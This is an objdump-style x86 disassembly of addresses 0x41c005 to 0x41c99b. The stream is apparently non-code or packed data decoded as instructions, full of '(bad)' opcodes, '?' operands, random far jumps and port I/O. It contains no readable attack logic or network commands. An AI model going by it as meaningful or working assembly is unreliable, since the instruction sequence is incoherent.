  41c005:	sub    DWORD PTR [ecx],eax
  41c007:	add    BYTE PTR ds:0xea000001,al
  41c00d:	xchg   DWORD PTR [ebx],ecx
  41c00f:	(bad)  
  41c010:	jge    0x41bfec
  41c012:	xor    DWORD PTR [eax-0x7e],0xf64fea6b
  41c019:	adc    eax,0xf2384df6
  41c01e:	inc    eax
  41c01f:	inc    edi
  41c020:	outs   dx,DWORD PTR ds:[esi]
  41c021:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c022:	xor    BYTE PTR [edi+0x5fc7c1f0],dh
  41c028:	mov    esp,0xd5b12658
  41c02d:	or     al,BYTE PTR [edx-0x4ee76a4c]
  41c033:	hlt    
  41c034:	jecxz  0x41c077
  41c036:	inc    ebp
  41c037:	stos   DWORD PTR es:[edi],eax
  41c038:	dec    ecx
  41c039:	pop    esp
  41c03a:	(bad)  
  41c03b:	mov    al,0xf0
  41c03d:	jno    0x41bfde
  41c03f:	div    edx
  41c041:	ins    DWORD PTR es:[edi],dx
  41c042:	xor    BYTE PTR [ecx+0x5e],0xdb
  41c046:	(bad)  
  41c047:	sar    BYTE PTR [ebx-0x2edf754a],1
  41c04d:	and    eax,0x48f9b569
  41c052:	or     DWORD PTR [eax+0x31af2ab5],0x42
  41c059:	pop    edi
  41c05a:	loope  0x41c067
  41c05c:	ret    0x850e
  41c05f:	cwde   
  41c060:	inc    eax
  41c061:	fst    DWORD PTR [ebx]
  41c063:	ror    BYTE PTR [esi],0xa3
  41c066:	inc    esi
  41c067:	jnp    0x41bff5
  41c069:	pushf  
  41c06a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c06b:	pop    edi
  41c06c:	pop    edx
  41c06d:	dec    eax
  41c06e:	int3   
  41c06f:	inc    esi
  41c070:	scas   al,BYTE PTR es:[edi]
  41c071:	add    DWORD PTR [eax+0x19],esp
  41c074:	add    DWORD PTR [eax],esp
  41c076:	imul   eax,DWORD PTR [edx-0x44055735],0x65f83fc1
  41c080:	jno    0x41c0fc
  41c082:	fwait
  41c083:	add    ecx,edi
  41c085:	dec    ebp
  41c086:	imul   esp,DWORD PTR [ebx+0x5],0x980d6e9c
  41c08d:	jl     0x41c02f
  41c08f:	adc    DWORD PTR [edi+0x4a98021e],esi
  41c095:	inc    eax
  41c096:	mov    eax,0xbfc835fe
  41c09b:	xchg   BYTE PTR [ebp+0x715e6de8],ah
  41c0a1:	cmp    edi,0xa7e8168c
  41c0a7:	mov    bh,0x2f
  41c0a9:	pop    ebx
  41c0aa:	ds popf 
  41c0ac:	mov    ss,WORD PTR [ecx+0x30]
  41c0af:	movd   esi,mm3
  41c0b2:	jecxz  0x41c080
  41c0b4:	in     al,0x67
  41c0b6:	not    DWORD PTR ds:[edx-0x2c]
  41c0ba:	mov    edx,0x3f006b54
  41c0bf:	pop    eax
  41c0c0:	ja     0x41c0f4
  41c0c2:	arpl   si,cx
  41c0c4:	inc    ebx
  41c0c5:	push   0xe3f61a3
  41c0ca:	jp     0x41c0c8
  41c0cc:	xchg   edx,eax
  41c0cd:	pop    es
  41c0ce:	in     al,0x87
  41c0d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0d1:	cmp    eax,0x3dffa674
  41c0d6:	pop    esp
  41c0d7:	mov    ebx,0xed59e685
  41c0dc:	sub    bl,BYTE PTR ds:0xab8c77d3
  41c0e2:	pop    ebp
  41c0e3:	or     BYTE PTR [ebx-0xe],cl
  41c0e6:	push   ecx
  41c0e7:	jne    0x41c0e7
  41c0e9:	adc    eax,0x582670a5
  41c0ee:	mov    ebx,0xb8fcdf11
  41c0f3:	das    
  41c0f4:	cmp    al,0xbe
  41c0f6:	les    esp,FWORD PTR [eax+0x76]
  41c0f9:	pop    esp
  41c0fa:	sbb    eax,0xae8a0652
  41c0ff:	xchg   edx,eax
  41c100:	daa    
  41c101:	add    ch,BYTE PTR [eax]
  41c103:	sbb    ecx,eax
  41c105:	add    ebx,ebp
  41c107:	jns    0x41c164
  41c109:	fisttp QWORD PTR [eax+0x128f5af]
  41c10f:	pop    ss
  41c110:	pushf  
	...
  41c171:	add    BYTE PTR [eax],al
  41c173:	add    cl,bl
  41c175:	dec    edx
  41c176:	mov    eax,ds:0xd9fbb3f8
  41c17b:	imul   edi,DWORD PTR ds:0xcce90501,0x48
  41c182:	shr    DWORD PTR [edx+0x12a8f],1
  41c188:	add    eax,0x9a000001
  41c18d:	jno    0x41c178
  41c18f:	in     eax,dx
  41c190:	lea    edi,[edx]
  41c192:	pop    ecx
  41c193:	stos   DWORD PTR es:[edi],eax
  41c194:	sbb    eax,0x36183b22
  41c199:	fist   DWORD PTR [edi]
  41c19b:	and    dh,ch
  41c19d:	add    ah,BYTE PTR [eax+0x0]
  41c1a0:	mov    WORD PTR [edx-0xb],?
  41c1a3:	fsubr  QWORD PTR [eax+0x33]
  41c1a6:	call   0x464a:0xa8052332
  41c1ad:	xor    bh,BYTE PTR [ecx]
  41c1af:	outs   dx,BYTE PTR ds:[esi]
  41c1b0:	or     esi,DWORD PTR [esp+edi*2]
  41c1b3:	in     eax,dx
  41c1b4:	(bad)  
  41c1b5:	sub    eax,0xde483856
  41c1ba:	or     eax,0xc33bf33c
  41c1bf:	ficomp DWORD PTR [ebp+0x1]
  41c1c2:	(bad)  
  41c1c4:	inc    edx
  41c1c5:	inc    ebx
  41c1c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1c7:	mov    edx,0x9f927d99
  41c1cc:	mov    dl,0x19
  41c1ce:	inc    edi
  41c1cf:	mov    ebp,0xcad20d1b
  41c1d4:	jno    0x41c21e
  41c1d6:	jle    0x41c178
  41c1d8:	jb     0x41c1af
  41c1da:	pop    esi
  41c1db:	sbb    al,0xdf
  41c1dd:	adc    bh,al
  41c1df:	lods   al,BYTE PTR ds:[esi]
  41c1e0:	sub    ebp,DWORD PTR [ecx]
  41c1e2:	aas    
  41c1e3:	pop    ds
  41c1e4:	xor    DWORD PTR [ecx+0x9],edi
  41c1e7:	mov    WORD PTR [esi-0x5d855712],?
  41c1ed:	xor    BYTE PTR [eax-0x293c7d9f],bh
  41c1f3:	pop    edi
  41c1f4:	inc    edx
  41c1f5:	and    al,0xce
  41c1f7:	stos   BYTE PTR es:[edi],al
  41c1f8:	pushf  
  41c1f9:	bound  edi,QWORD PTR [esp+ebp*1-0x4f9aadbc]
  41c200:	push   cs
  41c201:	add    eax,0xf67f564c
  41c206:	out    0x5f,al
  41c208:	nop
  41c209:	scas   al,BYTE PTR es:[edi]
  41c20a:	je     0x41c1b0
  41c20c:	sub    BYTE PTR [ebp-0x60],0xe2
  41c210:	cmp    al,0x2f
  41c212:	rol    ebx,cl
  41c214:	jns    0x41c1ed
  41c216:	or     BYTE PTR [ebx],ch
  41c218:	add    ebp,DWORD PTR [edx]
  41c21a:	cmp    al,0xf7
  41c21c:	xchg   esi,eax
  41c21d:	pop    es
  41c21e:	cdq    
  41c21f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c220:	int3   
  41c221:	xor    eax,eax
  41c223:	inc    eax
  41c224:	stc    
  41c225:	sub    al,0xfe
  41c227:	xchg   ebx,eax
  41c228:	addr16 pop es
  41c22a:	aaa    
  41c22b:	lods   al,BYTE PTR ds:[esi]
  41c22c:	test   al,0xf9
  41c22e:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41c230:	shl    bl,cl
  41c232:	mov    al,BYTE PTR [ebp-0x1]
  41c235:	ret    
  41c236:	aas    
  41c237:	cmp    eax,DWORD PTR ds:0x18ecced2
  41c23d:	sub    al,0x48
  41c23f:	jp     0x41c226
  41c241:	jmp    0x2d2ea3be
  41c246:	or     al,0x31
  41c248:	dec    ebx
  41c249:	dec    ecx
  41c24a:	sbb    eax,DWORD PTR [eax-0x4f19409d]
  41c250:	push   eax
  41c251:	(bad)  
  41c252:	retf   0x95a6
  41c255:	mov    ch,0x3b
  41c257:	pop    edx
  41c258:	ds and esi,esp
  41c25b:	jns    0x41c224
  41c25d:	in     eax,dx
  41c25e:	hlt    
  41c25f:	enter  0x6ad2,0x1d
  41c263:	outs   dx,BYTE PTR ds:[esi]
  41c264:	cmp    al,0x35
  41c266:	gs dec eax
  41c268:	or     BYTE PTR [edi+0x64d64133],al
  41c26e:	mov    eax,ds:0xa6bc4ba5
  41c273:	fnstsw WORD PTR es:[esp+ebp*1-0x2f]
  41c278:	or     DWORD PTR [edx+esi*2+0x7d],eax
  41c27c:	cli    
  41c27d:	je     0x41c214
  41c27f:	cmp    esi,eax
  41c281:	cmp    al,0xe
  41c283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c284:	pop    edi
  41c285:	xor    bh,dl
  41c287:	nop
  41c288:	dec    eax
  41c289:	enter  0x9439,0x0
  41c28d:	and    dl,BYTE PTR [edi-0x5d]
  41c290:	add    al,BYTE PTR [eax]
	...
  41c2f2:	add    BYTE PTR [eax],al
  41c2f4:	repz and ebp,ecx
  41c2f7:	push   ebp
  41c2f8:	(bad)  
  41c2fa:	sti    
  41c2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2fc:	enter  0x1a95,0x14
  41c300:	inc    esp
  41c301:	enter  0xae07,0x94
  41c305:	sub    eax,DWORD PTR [ecx]
  41c307:	add    BYTE PTR ds:0x75000001,al
  41c30d:	and    al,al
  41c30f:	pop    ebx
  41c310:	add    esi,0xffffffe4
  41c313:	call   0x5341e2cf
  41c318:	cmp    bl,0x3a
  41c31b:	jge    0x41c304
  41c31d:	outs   dx,DWORD PTR ds:[esi]
  41c31e:	pop    ecx
  41c31f:	jns    0x41c330
  41c321:	mov    WORD PTR [ecx+0x5d],fs
  41c324:	mov    esp,0x4e7594c7
  41c329:	xor    eax,0x5abda10a
  41c32e:	pop    eax
  41c32f:	test   al,0x3a
  41c332:	in     al,0xbc
  41c334:	cmp    BYTE PTR [esi-0xa],dl
  41c337:	retf   
  41c338:	jecxz  0x41c2e6
  41c33a:	adc    esp,edx
  41c33c:	and    al,0xe1
  41c33e:	mov    bh,0xc0
  41c340:	mov    esi,0x1e80edd6
  41c345:	sub    ebx,eax
  41c347:	ja     0x41c329
  41c349:	call   0xd78f902e
  41c34e:	cli    
  41c34f:	movq   mm7,mm5
  41c352:	shl    DWORD PTR [ebp-0x17],cl
  41c355:	pop    esp
  41c356:	xlat   BYTE PTR ds:[ebx]
  41c357:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41c359:	fsubrp st(0),st
  41c35b:	and    DWORD PTR [esi+0x6e],ebx
  41c35e:	scas   al,BYTE PTR es:[edi]
  41c35f:	jmp    0x41c39d
  41c361:	jge    0x41c3db
  41c363:	push   0xb89d7e63
  41c368:	je     0x41c3e3
  41c36a:	pop    edx
  41c36b:	(bad)  
  41c36c:	repnz rcr DWORD PTR [esi+0x309e1798],0x6c
  41c374:	mov    bh,0xd
  41c376:	xchg   ebp,eax
  41c377:	inc    esi
  41c378:	add    DWORD PTR [edi+0x145ce615],eax
  41c37e:	pop    ebp
  41c37f:	mov    esi,0x55b44388
  41c384:	setne  ah
  41c387:	inc    ecx
  41c388:	pop    edx
  41c389:	or     BYTE PTR [ecx+edi*8],0x4
  41c38d:	adc    eax,0x3f0d2721
  41c392:	xchg   esi,eax
  41c393:	je     0x41c357
  41c395:	cmp    cl,BYTE PTR [ebp+ebp*1+0x6e911f8c]
  41c39c:	pop    ebp
  41c39d:	or     DWORD PTR [eax-0x2b],esp
  41c3a0:	int    0x20
  41c3a2:	cmp    ebp,0x76e83851
  41c3a8:	dec    edi
  41c3a9:	adc    eax,DWORD PTR [esi]
  41c3ab:	test   ah,cl
  41c3ad:	inc    ecx
  41c3ae:	xchg   esi,eax
  41c3af:	bound  edx,QWORD PTR [ecx+0x176dadf7]
  41c3b5:	popa   
  41c3b6:	aas    
  41c3b7:	jmp    0x2f1:0xec8a9aa5
  41c3be:	cli    
  41c3bf:	dec    ecx
  41c3c0:	loopne 0x41c3bc
  41c3c2:	push   0xff89b777
  41c3c7:	xchg   DWORD PTR [ecx],ebp
  41c3c9:	or     eax,edx
  41c3cb:	sub    al,bl
  41c3cd:	test   edx,ebp
  41c3cf:	outs   dx,BYTE PTR ds:[esi]
  41c3d0:	adc    ah,ch
  41c3d2:	sahf   
  41c3d3:	mov    al,0x48
  41c3d5:	xchg   ecx,eax
  41c3d6:	jae    0x41c457
  41c3d8:	mov    ch,0x16
  41c3da:	ins    BYTE PTR es:[edi],dx
  41c3db:	stos   DWORD PTR es:[edi],eax
  41c3dc:	rcr    BYTE PTR [edi],cl
  41c3de:	mov    ebp,DWORD PTR [edi-0x78]
  41c3e1:	pop    ecx
  41c3e2:	push   edi
  41c3e3:	ins    DWORD PTR es:[edi],dx
  41c3e4:	mov    eax,ds:0xcfb2ac6e
  41c3e9:	mov    esi,0x77efff1c
  41c3ee:	data16 dec BYTE PTR [ecx]
  41c3f1:	pop    ds
  41c3f2:	jbe    0x41c473
  41c3f4:	std    
  41c3f5:	in     eax,0x60
  41c3f7:	push   esi
  41c3f8:	push   edx
  41c3f9:	mov    ch,0x64
  41c3fb:	mov    WORD PTR [ecx],es
  41c3fd:	mov    ebx,DWORD PTR [ebx]
  41c3ff:	aas    
  41c400:	shl    DWORD PTR [esi-0x1b],0xd9
  41c404:	mov    al,0xf9
  41c406:	imul   esp,esp,0x3a
  41c409:	mov    ds:0xd0eeeb3e,al
  41c40e:	rol    BYTE PTR [edx],cl
  41c410:	mov    ecx,0x0
	...
  41c471:	add    BYTE PTR [eax],al
  41c473:	add    BYTE PTR [ebx+0x20],dl
  41c476:	mov    al,ds:0x5faef3ae
  41c47b:	std    
  41c47c:	mov    bl,0x35
  41c47e:	dec    ebp
  41c47f:	push   ecx
  41c480:	sbb    ebp,DWORD PTR [edi+0x3e]
  41c483:	and    bl,BYTE PTR [ecx+0x500012c]
  41c489:	add    DWORD PTR [eax],eax
  41c48b:	add    BYTE PTR [edi-0x73],al
  41c48e:	or     BYTE PTR [eax-0x45],0x6c
  41c492:	pusha  
  41c493:	jl     0x41c4f0
  41c495:	retf   0x892f
  41c498:	mov    ah,0x79
  41c49a:	adc    BYTE PTR [eax],ah
  41c49c:	and    al,0x99
  41c49e:	sbb    eax,0x3aa63c6c
  41c4a3:	push   eax
  41c4a4:	push   ecx
  41c4a5:	ffreep st(4)
  41c4a7:	mov    eax,0x92195797
  41c4ac:	ret    
  41c4ad:	jb     0x41c495
  41c4af:	push   ebp
  41c4b0:	or     al,0x6b
  41c4b2:	test   al,0x11
  41c4b4:	pop    edx
  41c4b5:	cmp    eax,DWORD PTR [edi+edx*2-0x37ace328]
  41c4bc:	arpl   di,cx
  41c4be:	mov    eax,ds:0xe935aa83
  41c4c3:	aas    
  41c4c4:	jnp    0x41c543
  41c4c6:	test   eax,0xdc583857
  41c4cb:	xchg   esi,eax
  41c4cc:	dec    edi
  41c4cd:	scas   eax,DWORD PTR es:[edi]
  41c4ce:	sahf   
  41c4cf:	ds in  al,dx
  41c4d1:	(bad)  
  41c4d3:	lods   eax,DWORD PTR ds:[esi]
  41c4d4:	jo     0x41c4b6
  41c4d6:	icebp  
  41c4d7:	or     esp,DWORD PTR [edi-0x176fda0b]
  41c4dd:	ffreep st(7)
  41c4df:	or     ebp,ecx
  41c4e1:	and    DWORD PTR [ebp+0x12],ecx
  41c4e4:	imul   eax,DWORD PTR [esi+0xf9070b7],0xef2d9e77
  41c4ee:	jge    0x41c4cc
  41c4f0:	les    edx,FWORD PTR [ebx+0x3c]
  41c4f3:	out    0x2c,al
  41c4f5:	int3   
  41c4f6:	aad    0xa
  41c4f8:	scas   eax,DWORD PTR es:[edi]
  41c4f9:	dec    ebp
  41c4fa:	in     eax,0xa5
  41c4fc:	push   0xffffffc3
  41c4fe:	xor    eax,0xf5fc7036
  41c503:	shr    BYTE PTR [ebx+0x62],1
  41c506:	(bad)  
  41c507:	xor    al,0x85
  41c509:	xchg   esi,ebx
  41c50b:	les    ebx,FWORD PTR [esi+0x4f]
  41c50e:	mov    cl,0x2f
  41c510:	ror    BYTE PTR [edi-0x36272e6d],1
  41c516:	sbb    eax,0x7a790577
  41c51b:	push   eax
  41c51c:	mov    BYTE PTR [ebx+ebp*1+0x635a95ca],ah
  41c523:	inc    ebp
  41c524:	adc    eax,esi
  41c526:	loope  0x41c523
  41c528:	daa    
  41c529:	in     eax,0xfa
  41c52b:	out    dx,eax
  41c52c:	mov    ds:0x39a0db0e,al
  41c531:	loope  0x41c516
  41c533:	pop    edi
  41c534:	mov    cl,0xc0
  41c536:	and    DWORD PTR [ebp+esi*8-0x35],esp
  41c53a:	lods   eax,DWORD PTR ds:[esi]
  41c53b:	dec    eax
  41c53c:	pop    edx
  41c53d:	out    0xa,al
  41c53f:	out    0xf5,eax
  41c541:	mov    bh,0xe3
  41c543:	lea    esi,[edi]
  41c545:	cmp    dl,BYTE PTR [ebp-0xb]
  41c548:	push   edi
  41c549:	hlt    
  41c54a:	retf   0x15b1
  41c54d:	jmp    0x2d846981
  41c552:	dec    ecx
  41c553:	sbb    eax,0xb018eafd
  41c558:	fld    QWORD PTR [ebx]
  41c55a:	std    
  41c55b:	add    ecx,DWORD PTR ss:[ecx+0x5e]
  41c55f:	or     DWORD PTR [edx],edi
  41c561:	push   0xf692d5fd
  41c566:	sub    dl,BYTE PTR [esi]
  41c568:	sbb    al,ch
  41c56a:	outs   dx,BYTE PTR ds:[esi]
  41c56b:	mov    dl,0x25
  41c56d:	adc    DWORD PTR [edx],0xaadbab19
  41c573:	es pushf 
  41c575:	arpl   WORD PTR [edx-0x54],si
  41c578:	sbb    al,0x32
  41c57a:	xchg   esp,ecx
  41c57c:	adc    esp,DWORD PTR [edx+0x543f2875]
  41c582:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c583:	mov    WORD PTR [ebx-0x74],?
  41c586:	sbb    eax,0xec2d58e2
  41c58b:	aas    
  41c58c:	popa   
  41c58d:	dec    ebp
  41c58e:	cmp    al,0x23
  41c590:	outs   dx,BYTE PTR ds:[esi]
	...
  41c5f1:	add    BYTE PTR [eax],al
  41c5f3:	add    ch,al
  41c5f5:	and    edx,DWORD PTR [ecx-0xa4808db]
  41c5fb:	jecxz  0x41c640
  41c5fd:	and    ch,ch
  41c5ff:	call   0x2d9e:0x73b431e
  41c606:	add    DWORD PTR [eax],eax
  41c608:	add    eax,0x56000001
  41c60d:	sbb    bl,bl
  41c60f:	fldcw  WORD PTR [esi+ebx*1+0x16]
  41c613:	outs   dx,BYTE PTR ds:[esi]
  41c614:	jge    0x41c62c
  41c616:	pusha  
  41c617:	mov    ecx,0xfb709442
  41c61c:	int    0xb0
  41c61e:	lods   eax,DWORD PTR ds:[esi]
  41c61f:	mov    bh,BYTE PTR [ebp+0x53]
  41c622:	lods   eax,DWORD PTR ds:[esi]
  41c623:	sbb    eax,0x28f72b49
  41c628:	call   0x3e82:0x607a7de2
  41c62f:	inc    ecx
  41c630:	add    esp,DWORD PTR [ebp+edi*2+0x73b80315]
  41c637:	das    
  41c638:	loopne 0x41c5bb
  41c63a:	sahf   
  41c63b:	sub    ebp,esi
  41c63d:	pop    esp
  41c63e:	jl     0x41c677
  41c640:	add    eax,0xb3ebc6ea
  41c645:	clc    
  41c646:	dec    edi
  41c647:	push   cs
  41c648:	outs   dx,BYTE PTR ds:[esi]
  41c649:	mov    ebx,0x120e985c
  41c64e:	cmp    edx,eax
  41c650:	lahf   
  41c651:	lock xchg ebp,eax
  41c653:	xchg   ebx,eax
  41c654:	xor    al,0x6a
  41c656:	inc    ebx
  41c657:	xchg   esi,eax
  41c658:	jge    0x41c635
  41c65a:	xor    esp,edi
  41c65c:	adc    al,0xe9
  41c65e:	xchg   ebx,eax
  41c65f:	das    
  41c660:	and    eax,DWORD PTR ds:0xa2cd5c90
  41c666:	iret   
  41c667:	add    bh,BYTE PTR [edi+eax*4+0x77fac939]
  41c66e:	jp     0x41c60b
  41c670:	sub    edi,DWORD PTR [eax+0x2b6d9208]
  41c676:	cmp    al,0x85
  41c678:	mov    al,ds:0x4bae5409
  41c67d:	sahf   
  41c67e:	push   es
  41c67f:	jg     0x41c6bd
  41c681:	or     edi,DWORD PTR [ecx-0xd7af63]
  41c687:	in     al,0xd6
  41c689:	(bad)  
  41c68a:	pop    eax
  41c68b:	and    eax,0x6ecb2c94
  41c690:	xchg   DWORD PTR [eax-0x123ec98],ebx
  41c696:	xlat   BYTE PTR ds:[ebx]
  41c697:	test   ah,cl
  41c699:	(bad)  
  41c69b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c69c:	jnp    0x41c718
  41c69e:	xor    ecx,DWORD PTR [esi-0x5274ee3a]
  41c6a4:	clc    
  41c6a5:	xor    DWORD PTR [edx+esi*8+0x26],esi
  41c6a9:	cmp    eax,0xc40d3403
  41c6ae:	rcl    BYTE PTR [edx+0x3acd0405],1
  41c6b4:	int3   
  41c6b5:	les    ebx,FWORD PTR [ecx+0x7e]
  41c6b8:	add    bl,BYTE PTR [edx+ecx*1-0x13]
  41c6bc:	sub    BYTE PTR [ecx-0x1e3c2ba2],dl
  41c6c2:	out    0xe9,al
  41c6c4:	mov    eax,0xbbab19bb
  41c6c9:	sbb    al,0x4c
  41c6cb:	xchg   edi,eax
  41c6cc:	fwait
  41c6cd:	test   edx,ebx
  41c6cf:	popf   
  41c6d0:	sub    al,0x8f
  41c6d2:	int3   
  41c6d3:	xchg   ebx,eax
  41c6d4:	arpl   WORD PTR [ecx-0x47fb0dd7],sp
  41c6da:	mov    al,0x8a
  41c6dc:	(bad)  
  41c6de:	or     BYTE PTR [ebp-0x50],dl
  41c6e1:	dec    esi
  41c6e2:	add    esp,DWORD PTR [ebp-0x5503dde0]
  41c6e8:	stos   DWORD PTR es:[edi],eax
  41c6e9:	push   0x6c723659
  41c6ee:	pusha  
  41c6ef:	sbb    edi,DWORD PTR [eax-0x7e]
  41c6f2:	or     esi,eax
  41c6f4:	xor    esi,esp
  41c6f6:	sub    ch,BYTE PTR [edi-0x24]
  41c6f9:	rol    DWORD PTR [edx+0x2b],1
  41c6fc:	stos   DWORD PTR es:[edi],eax
  41c6fd:	jbe    0x41c70c
  41c6ff:	jp     0x41c740
  41c701:	cmp    al,BYTE PTR [ebx-0x3e]
  41c704:	fwait
  41c705:	dec    ebp
  41c706:	cdq    
  41c707:	loopne 0x41c6e8
  41c709:	dec    ebp
  41c70a:	dec    ecx
  41c70b:	jmp    0x40691351
  41c710:	sub    al,0x0
	...
  41c772:	add    BYTE PTR [eax],al
  41c774:	fiadd  DWORD PTR [ecx]
  41c776:	ret    0xdb86
  41c779:	(bad)  
  41c77a:	ficomp WORD PTR [ebp-0xf]
  41c77d:	cmp    DWORD PTR [esi],esi
  41c77f:	lahf   
  41c780:	sbb    bh,cl
  41c782:	fiadd  DWORD PTR [edx-0x5d]
  41c785:	add    DWORD PTR cs:[eax],eax
  41c788:	add    eax,0x26000001
  41c78d:	inc    ecx
  41c78e:	adc    bh,BYTE PTR [ecx-0x80]
  41c791:	and    BYTE PTR [eax+0x2],dl
  41c794:	cmp    DWORD PTR [eax-0x28409ca6],0x16
  41c79b:	in     al,0x7f
  41c79d:	mov    esp,0x886f56c
  41c7a2:	mov    ch,0x65
  41c7a4:	aad    0xe5
  41c7a6:	lea    ebp,[esi-0x70d02442]
  41c7ac:	jae    0x41c784
  41c7ae:	sbb    DWORD PTR [ebp+0x2c],edi
  41c7b1:	repnz dec esp
  41c7b3:	push   ss
  41c7b4:	in     al,dx
  41c7b5:	sub    bh,BYTE PTR [esi+0x1d]
  41c7b8:	sti    
  41c7b9:	mov    esi,0x8a10b060
  41c7be:	cld    
  41c7bf:	out    dx,eax
  41c7c0:	mov    WORD PTR [ebp-0x32455aff],?
  41c7c6:	int    0x4b
  41c7c8:	inc    ebp
  41c7c9:	dec    ebp
  41c7ca:	lock dec eax
  41c7cc:	mov    DWORD PTR [edi+0x59],esp
  41c7cf:	mov    cl,0xcf
  41c7d1:	jae    0x41c76b
  41c7d3:	fnsave ds:[ebp-0x485d8145]
  41c7da:	data16 mov bl,0x74
  41c7dd:	dec    ecx
  41c7de:	mov    esi,0xf1868741
  41c7e3:	loopne 0x41c7d4
  41c7e5:	outs   dx,BYTE PTR ds:[esi]
  41c7e6:	pop    ds
  41c7e7:	sbb    al,0x77
  41c7e9:	psubw  mm6,mm3
  41c7ec:	dec    ebp
  41c7ed:	sbb    BYTE PTR [esi],dh
  41c7ef:	pop    edi
  41c7f0:	or     al,0xd4
  41c7f2:	pop    eax
  41c7f3:	xchg   edx,eax
  41c7f4:	xlat   BYTE PTR ds:[ebx]
  41c7f5:	mov    ds:0x43fb8003,eax
  41c7fa:	out    0xff,al
  41c7fc:	pop    es
  41c7fd:	ins    DWORD PTR es:[edi],dx
  41c7fe:	mov    bl,0x5d
  41c800:	call   0x4339:0xde1c1193
  41c807:	push   ebx
  41c808:	jmp    0x50d1:0x9045e3f2
  41c80f:	push   edi
  41c810:	push   ds
  41c811:	add    DWORD PTR [eax],0x7a
  41c814:	inc    esi
  41c815:	lock in eax,0xf8
  41c818:	pop    esp
  41c819:	outs   dx,DWORD PTR ds:[esi]
  41c81a:	xchg   ecx,eax
  41c81b:	or     DWORD PTR ds:0x8fa90b9f,ebp
  41c821:	ret    
  41c822:	dec    ebx
  41c823:	icebp  
  41c824:	jmp    DWORD PTR [esi]
  41c826:	cmp    al,0xec
  41c828:	pop    eax
  41c829:	sub    cl,BYTE PTR [edi]
  41c82b:	not    DWORD PTR [ebx-0x38]
  41c82e:	fiadd  WORD PTR [ebp+0x11]
  41c831:	xor    dl,BYTE PTR [edi]
  41c833:	rol    esi,0x4
  41c836:	add    al,0x46
  41c838:	(bad)  
  41c839:	mov    ?,WORD PTR [edi]
  41c83b:	(bad)  
  41c83c:	sbb    bh,BYTE PTR [edx-0x1124408d]
  41c842:	repnz push eax
  41c844:	cs pop edi
  41c846:	imul   ebp,edx,0xffffffc4
  41c849:	cs out 0x5b,al
  41c84c:	mov    ds:0xc586ade,al
  41c851:	loop   0x41c838
  41c853:	ret    0x65ea
  41c856:	mov    DWORD PTR [edx],esi
  41c858:	push   ds
  41c859:	cmp    ax,0xe194
  41c85d:	cs call 0xc7c6b635
  41c863:	sahf   
  41c864:	pop    ecx
  41c865:	or     DWORD PTR [edi-0x530ffd6f],ebx
  41c86b:	pop    ebx
  41c86c:	retf   
  41c86d:	dec    ecx
  41c86e:	bound  ecx,QWORD PTR [edi]
  41c870:	out    0xf0,eax
  41c872:	mov    DWORD PTR [ebx],0xd9d0f3d6
  41c878:	mov    ebp,0xdadb414
  41c87d:	pop    ss
  41c87e:	enter  0xfddd,0x9
  41c882:	mov    ch,0x1a
  41c884:	push   edx
  41c885:	add    al,0x4d
  41c887:	inc    ecx
  41c888:	sub    eax,DWORD PTR [eax]
  41c88a:	sbb    ebx,DWORD PTR [ebx-0x18a5647a]
  41c890:	and    eax,0x0
	...
  41c8f1:	add    BYTE PTR [eax],al
  41c8f3:	add    BYTE PTR [ebx+0x34],ah
  41c8f6:	lods   eax,DWORD PTR ds:[esi]
  41c8f7:	xor    al,0xff
  41c8f9:	mov    ebp,0x291877fb
  41c8fe:	cmp    eax,DWORD PTR [ecx]
  41c900:	mov    bl,0x9d
  41c902:	cld    
  41c903:	and    eax,0x12fa8
  41c908:	add    eax,0x45000001
  41c90d:	and    dh,bh
  41c90f:	add    BYTE PTR [edi+0x47a85c87],ah
  41c915:	outs   dx,DWORD PTR ds:[esi]
  41c916:	cmp    ah,BYTE PTR [ebp-0x1c47b7ae]
  41c91c:	shl    BYTE PTR [ebx-0x3bf4f625],0x20
  41c923:	je     0x41c8a6
  41c925:	mov    al,0x96
  41c927:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c928:	ins    DWORD PTR es:[edi],dx
  41c929:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c92a:	xlat   BYTE PTR ds:[ebx]
  41c92b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c92c:	cmp    al,0x73
  41c92e:	xchg   esi,eax
  41c92f:	pushf  
  41c930:	lock mov dh,0x91
  41c933:	xor    al,0x96
  41c935:	shr    BYTE PTR [edx+0x694b16de],0xbf
  41c93c:	bound  edi,QWORD PTR [ecx+edi*2-0x4cb7533a]
  41c943:	retf   0x823d
  41c946:	jg     0x41c9b9
  41c948:	adc    ch,BYTE PTR es:[eax-0x14143126]
  41c94f:	mov    BYTE PTR [eax],dh
  41c951:	outs   dx,BYTE PTR ds:[esi]
  41c952:	inc    edi
  41c953:	retf   
  41c954:	shr    DWORD PTR [ecx-0x4c],cl
  41c957:	sbb    eax,0x4029600b
  41c95c:	sahf   
  41c95d:	data16 sbb al,0x10
  41c960:	cmp    al,0x92
  41c962:	loope  0x41c8ec
  41c964:	dec    esp
  41c965:	dec    esp
  41c966:	leave  
  41c967:	cld    
  41c968:	and    DWORD PTR [edx],edx
  41c96a:	push   cs
  41c96b:	jge    0x41c933
  41c96d:	cmp    BYTE PTR [esi+0x3],0x65
  41c971:	f2xm1  
  41c973:	mov    esi,DWORD PTR [esi+0x10]
  41c976:	call   0xf936:0xda626d8d
  41c97d:	dec    edi
  41c97e:	xchg   ebx,eax
  41c97f:	mov    esi,0x8510b96a
  41c984:	mov    cl,0xcc
  41c986:	push   edi
  41c987:	pushf  
  41c988:	mov    eax,ds:0x94599e7e
  41c98d:	arpl   WORD PTR [edx],sp
  41c98f:	fistp  WORD PTR [ebp-0x1]
  41c992:	cmp    dl,ah
  41c994:	cmp    eax,0x69d0a111
  41c999:	or     edx,ebx
  41c99b:	call   0x6ac4b417
